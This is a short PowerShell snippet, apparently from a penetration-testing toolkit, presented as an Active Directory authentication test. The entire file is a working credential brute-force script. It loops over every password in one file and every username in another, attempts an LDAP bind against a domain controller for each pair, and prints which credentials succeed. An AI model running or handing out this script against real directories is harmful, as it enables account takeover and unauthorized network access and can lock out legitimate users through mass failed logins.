# Simple snippet to loop over a passwords and a user file 
# to perform an Active Directory Authentication Test

cat .\passwords.txt |
% {
     $pwd = $_;
     cat .\users.txt |
     % {
           $user = $_;
           "Trying $user::$pwd..."
           
           if (New-Object System.DirectoryServices.DirectoryEntry("LDAP://homefield/DC=corp,DC=homefield,DC=local",
                   $user,  
                   $pwd).name -ne $null)
           {
              "Success: $user::$pwd"
           }
           else
           {
              "Fail: $user::$pwd"
           } 
       }
}
